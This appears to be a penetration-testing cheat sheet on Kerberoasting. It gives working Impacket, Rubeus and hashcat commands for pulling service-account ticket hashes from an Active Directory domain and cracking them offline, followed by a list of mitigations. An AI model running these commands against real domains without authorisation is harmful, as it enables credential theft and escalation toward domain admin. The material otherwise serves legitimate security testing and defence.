# Kerberoasting

Request Kerberos service tickets for accounts with SPNs set, then crack them offline. Any domain user can request these tickets.

## Why It Works

- Service accounts often have SPNs (Service Principal Names) registered
- Any authenticated domain user can request a TGS for any SPN
- The TGS is encrypted with the service account's NTLM hash
- Crack it offline -- no lockout, no detection

## Attack

### From Linux (Impacket)

```bash
# Get TGS hashes for all Kerberoastable accounts
GetUserSPNs.py DOMAIN.local/username:'password' -dc-ip DC_IP -request

# Save to file
GetUserSPNs.py DOMAIN.local/username:'password' -dc-ip DC_IP -request -outputfile kerberoast.txt
```

### From Windows (Rubeus)

```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
```

## Cracking the Hash

```bash
# Hashcat mode 13100 for Kerberos 5 TGS-REP (etype 23)
hashcat -m 13100 kerberoast.txt /path/to/wordlist

# With rules for better coverage
hashcat -m 13100 kerberoast.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule
```

## What Makes It Valuable

- Service accounts are often over-privileged
- Passwords rarely get changed
- May have Domain Admin privileges
- Cracking happens offline -- no failed login attempts

## Mitigations

- Use strong passwords for service accounts (30+ characters)
- Use Managed Service Accounts (MSAs) or Group MSAs
- Don't assign SPNs to admin accounts
- Regularly audit accounts with SPNs set
- Monitor for mass TGS requests (Event ID 4769)
